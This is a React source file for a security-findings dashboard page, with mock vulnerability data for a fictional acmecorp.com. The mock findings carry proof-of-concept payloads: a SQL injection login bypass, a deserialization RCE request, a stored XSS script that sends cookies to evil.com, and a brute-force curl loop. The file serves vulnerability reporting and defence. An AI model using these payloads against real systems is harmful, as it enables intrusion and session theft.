"use client"

import { useState, Fragment } from "react"
import { DashboardSidebar } from "@/components/dashboard/sidebar"
import { TopBar } from "@/components/dashboard/top-bar"
import { 
  Search, 
  SlidersHorizontal, 
  ChevronDown,
  ChevronRight,
  Download,
  ExternalLink,
  AlertTriangle,
  Shield,
  Bug,
  Link as LinkIcon
} from "lucide-react"
import { cn } from "@/lib/utils"

// Mock data for findings
const FINDINGS = [
  {
    id: "CVE-2024-1234",
    title: "SQL Injection in User Authentication Endpoint",
    severity: "critical",
    cvss: 9.8,
    target: "api.acmecorp.com/auth/login",
    status: "open",
    owasp: "A03:2021",
    description: "A SQL injection vulnerability exists in the user authentication endpoint that allows attackers to bypass authentication and extract sensitive data from the database.",
    remediation: "Implement parameterized queries or prepared statements. Validate and sanitize all user inputs before processing.",
    poc: "POST /auth/login HTTP/1.1\nContent-Type: application/json\n\n{\"username\": \"admin'--\", \"password\": \"x\"}",
  },
  {
    id: "CVE-2024-5678",
    title: "Remote Code Execution via Deserialization",
    severity: "critical",
    cvss: 9.1,
    target: "api.acmecorp.com/upload",
    status: "in_progress",
    owasp: "A08:2021",
    description: "Insecure deserialization of user-controlled data allows remote code execution on the server. Attackers can execute arbitrary commands with server privileges.",
    remediation: "Avoid deserializing untrusted data. Implement integrity checks and use type-safe serialization formats.",
    poc: "curl -X POST -d '{\"__class__\":\"subprocess.Popen\",\"args\":[\"id\"]}' target/upload",
  },
  {
    id: "CVE-2024-9012",
    title: "Broken Access Control on Admin Panel",
    severity: "high",
    cvss: 8.6,
    target: "admin.acmecorp.com/users",
    status: "open",
    owasp: "A01:2021",
    description: "Insufficient access control allows authenticated users to access administrative functions and view/modify other users' data.",
    remediation: "Implement proper role-based access control (RBAC) and verify permissions on every request.",
    poc: "GET /admin/users HTTP/1.1\nCookie: session=user_token\n\n# Returns all user data including admin accounts",
  },
  {
    id: "CVE-2024-3456",
    title: "Cross-Site Scripting (XSS) in Comments",
    severity: "medium",
    cvss: 6.1,
    target: "acmecorp.com/posts/*/comments",
    status: "open",
    owasp: "A03:2021",
    description: "Stored XSS vulnerability in the comments section allows attackers to inject malicious scripts that execute in victims' browsers.",
    remediation: "Implement proper output encoding and Content Security Policy (CSP) headers.",
    poc: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
  },
  {
    id: "CVE-2024-7890",
    title: "Sensitive Data Exposure in API Response",
    severity: "medium",
    cvss: 5.3,
    target: "api.acmecorp.com/users/profile",
    status: "resolved",
    owasp: "A02:2021",
    description: "API endpoint returns excessive data including password hashes and internal IDs in the response body.",
    remediation: "Implement proper data filtering and return only necessary fields. Use DTOs for API responses.",
    poc: "GET /users/profile returns: {\"id\":1,\"email\":\"user@test.com\",\"password_hash\":\"$2b$...\"}",
  },
  {
    id: "CVE-2024-2345",
    title: "Missing Rate Limiting on Login",
    severity: "low",
    cvss: 3.7,
    target: "api.acmecorp.com/auth/login",
    status: "open",
    owasp: "A07:2021",
    description: "No rate limiting on authentication endpoint allows brute force attacks against user accounts.",
    remediation: "Implement rate limiting, account lockout policies, and consider adding CAPTCHA after failed attempts.",
    poc: "for i in {1..1000}; do curl -X POST -d '{\"user\":\"admin\",\"pass\":\"$i\"}' target/login; done",
  },
]

const severityConfig = {
  critical: {
    label: "Critical",
    bgClass: "bg-critical/10",
    textClass: "text-critical",
    dotClass: "bg-critical animate-pulse",
  },
  high: {
    label: "High",
    bgClass: "bg-high/10",
    textClass: "text-high",
    dotClass: "bg-high",
  },
  medium: {
    label: "Medium",
    bgClass: "bg-medium/10",
    textClass: "text-medium",
    dotClass: "bg-medium",
  },
  low: {
    label: "Low",
    bgClass: "bg-low/10",
    textClass: "text-low",
    dotClass: "bg-low",
  },
}

const statusConfig = {
  open: { label: "Open", class: "bg-critical/10 text-critical" },
  in_progress: { label: "In Progress", class: "bg-primary/10 text-primary" },
  resolved: { label: "Resolved", class: "bg-low/10 text-low" },
}

export default function FindingsPage() {
  const [searchQuery, setSearchQuery] = useState("")
  const [expandedRow, setExpandedRow] = useState<string | null>(null)
  const [severityFilter, setSeverityFilter] = useState<string>("all")
  const [statusFilter, setStatusFilter] = useState<string>("all")

  const filteredFindings = FINDINGS.filter((finding) => {
    const matchesSearch =
      finding.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      finding.id.toLowerCase().includes(searchQuery.toLowerCase()) ||
      finding.target.toLowerCase().includes(searchQuery.toLowerCase())
    const matchesSeverity = severityFilter === "all" || finding.severity === severityFilter
    const matchesStatus = statusFilter === "all" || finding.status === statusFilter
    return matchesSearch && matchesSeverity && matchesStatus
  })

  const severityCounts = {
    critical: FINDINGS.filter((f) => f.severity === "critical").length,
    high: FINDINGS.filter((f) => f.severity === "high").length,
    medium: FINDINGS.filter((f) => f.severity === "medium").length,
    low: FINDINGS.filter((f) => f.severity === "low").length,
  }

  return (
    <div className="min-h-screen bg-background">
      <DashboardSidebar />

      <div className="pl-60 transition-all duration-200">
        <TopBar title="Findings" />

        <main className="p-6">
          {/* Header */}
          <div className="mb-6 flex items-center justify-between">
            <div>
              <h1 className="text-2xl font-semibold text-foreground">Security Findings</h1>
              <p className="mt-1 text-sm text-muted-foreground">
                Vulnerabilities discovered across your attack surface
              </p>
            </div>
            <button className="flex items-center gap-2 rounded-md border border-border px-4 py-2.5 text-sm font-medium text-muted-foreground transition-all hover:bg-elevated hover:text-foreground">
              <Download className="h-4 w-4" />
              Export
            </button>
          </div>

          {/* Severity Summary */}
          <div className="mb-6 flex items-center gap-3">
            {Object.entries(severityCounts).map(([severity, count]) => {
              const config = severityConfig[severity as keyof typeof severityConfig]
              return (
                <button
                  key={severity}
                  onClick={() => setSeverityFilter(severityFilter === severity ? "all" : severity)}
                  className={cn(
                    "flex items-center gap-2 rounded-lg border px-4 py-2.5 transition-all",
                    severityFilter === severity
                      ? "border-primary bg-primary/10"
                      : "border-border hover:border-muted-foreground"
                  )}
                >
                  <span className={cn("h-2.5 w-2.5 rounded-full", config.dotClass)} />
                  <span className="text-sm font-medium text-foreground">{count}</span>
                  <span className="text-sm text-muted-foreground">{config.label}</span>
                </button>
              )
            })}
          </div>

          {/* Filter/Action Bar */}
          <div className="mb-6 flex items-center gap-3">
            <div className="relative flex-1 max-w-md">
              <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
              <input
                type="text"
                placeholder="Search by CVE, title, or target..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="h-10 w-full rounded-md border border-border bg-card pl-10 pr-4 text-sm text-foreground placeholder:text-muted-foreground focus:border-primary focus:outline-none focus:ring-2 focus:ring-primary/20 transition-all"
              />
            </div>
            
            <select
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
              className="h-10 rounded-md border border-border bg-card px-3 text-sm text-foreground focus:border-primary focus:outline-none focus:ring-2 focus:ring-primary/20"
            >
              <option value="all">All Status</option>
              <option value="open">Open</option>
              <option value="in_progress">In Progress</option>
              <option value="resolved">Resolved</option>
            </select>

            <select
              className="h-10 rounded-md border border-border bg-card px-3 text-sm text-foreground focus:border-primary focus:outline-none focus:ring-2 focus:ring-primary/20"
            >
              <option value="all">All OWASP</option>
              <option value="A01:2021">A01:2021 - Broken Access Control</option>
              <option value="A02:2021">A02:2021 - Cryptographic Failures</option>
              <option value="A03:2021">A03:2021 - Injection</option>
            </select>
          </div>

          {/* Findings Table */}
          <div className="rounded-lg border border-border bg-card overflow-hidden">
            <table className="w-full">
              <thead>
                <tr className="border-b border-border bg-elevated/50">
                  <th className="w-8 px-4 py-3"></th>
                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
                    ID / Title
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
                    Severity
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
                    CVSS
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
                    Target
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
                    Status
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
                    OWASP
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border">
                {filteredFindings.map((finding) => {
                  const severity = severityConfig[finding.severity as keyof typeof severityConfig]
                  const status = statusConfig[finding.status as keyof typeof statusConfig]
                  const isExpanded = expandedRow === finding.id

                  return (
                    <Fragment key={finding.id}>
                      <tr
                        onClick={() => setExpandedRow(isExpanded ? null : finding.id)}
                        className="group cursor-pointer transition-colors hover:bg-elevated/50"
                      >
                        <td className="px-4 py-4">
                          <ChevronRight
                            className={cn(
                              "h-4 w-4 text-muted-foreground transition-transform",
                              isExpanded && "rotate-90"
                            )}
                          />
                        </td>
                        <td className="px-4 py-4">
                          <div>
                            <span className="font-medium text-foreground group-hover:text-primary transition-colors">
                              {finding.title}
                            </span>
                            <p className="mt-0.5 font-mono text-xs text-muted-foreground">
                              {finding.id}
                            </p>
                          </div>
                        </td>
                        <td className="px-4 py-4">
                          <span className={cn(
                            "inline-flex items-center gap-1.5 rounded-md px-2.5 py-1 text-xs font-medium",
                            severity.bgClass,
                            severity.textClass
                          )}>
                            <span className={cn("h-1.5 w-1.5 rounded-full", severity.dotClass)} />
                            {severity.label}
                          </span>
                        </td>
                        <td className="px-4 py-4">
                          <span className={cn(
                            "font-mono text-sm font-semibold",
                            finding.cvss >= 9 ? "text-critical" :
                            finding.cvss >= 7 ? "text-high" :
                            finding.cvss >= 4 ? "text-medium" : "text-low"
                          )}>
                            {finding.cvss.toFixed(1)}
                          </span>
                        </td>
                        <td className="px-4 py-4">
                          <span className="font-mono text-xs text-muted-foreground">
                            {finding.target}
                          </span>
                        </td>
                        <td className="px-4 py-4">
                          <span className={cn(
                            "rounded-md px-2.5 py-1 text-xs font-medium",
                            status.class
                          )}>
                            {status.label}
                          </span>
                        </td>
                        <td className="px-4 py-4">
                          <span className="rounded-md border border-border bg-elevated px-2 py-0.5 text-xs font-mono text-muted-foreground">
                            {finding.owasp}
                          </span>
                        </td>
                      </tr>
                      
                      {/* Expanded Row */}
                      {isExpanded && (
                        <tr>
                          <td colSpan={7} className="bg-background p-0">
                            <div className="border-l-2 border-primary ml-6 p-6">
                              <div className="grid grid-cols-1 gap-6 lg:grid-cols-3">
                                {/* Description */}
                                <div className="lg:col-span-2">
                                  <div className="mb-4">
                                    <h4 className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
                                      <AlertTriangle className="h-4 w-4 text-critical" />
                                      Description
                                    </h4>
                                    <p className="text-sm text-muted-foreground leading-relaxed">
                                      {finding.description}
                                    </p>
                                  </div>
                                  
                                  <div className="mb-4">
                                    <h4 className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
                                      <Shield className="h-4 w-4 text-low" />
                                      Remediation
                                    </h4>
                                    <p className="text-sm text-muted-foreground leading-relaxed">
                                      {finding.remediation}
                                    </p>
                                  </div>
                                </div>

                                {/* PoC */}
                                <div>
                                  <h4 className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
                                    <Bug className="h-4 w-4 text-high" />
                                    Proof of Concept
                                  </h4>
                                  <pre className="rounded-md bg-elevated p-3 text-xs text-muted-foreground overflow-x-auto font-mono">
                                    {finding.poc}
                                  </pre>
                                  <div className="mt-3 flex gap-2">
                                    <button className="flex items-center gap-1.5 rounded-md bg-primary/10 px-3 py-1.5 text-xs font-medium text-primary hover:bg-primary/20 transition-colors">
                                      <ExternalLink className="h-3 w-3" />
                                      View Full Report
                                    </button>
                                    <button className="flex items-center gap-1.5 rounded-md border border-border px-3 py-1.5 text-xs font-medium text-muted-foreground hover:bg-elevated transition-colors">
                                      <LinkIcon className="h-3 w-3" />
                                      Copy Link
                                    </button>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </td>
                        </tr>
                      )}
                    </Fragment>
                  )
                })}
              </tbody>
            </table>
          </div>
        </main>
      </div>
    </div>
  )
}
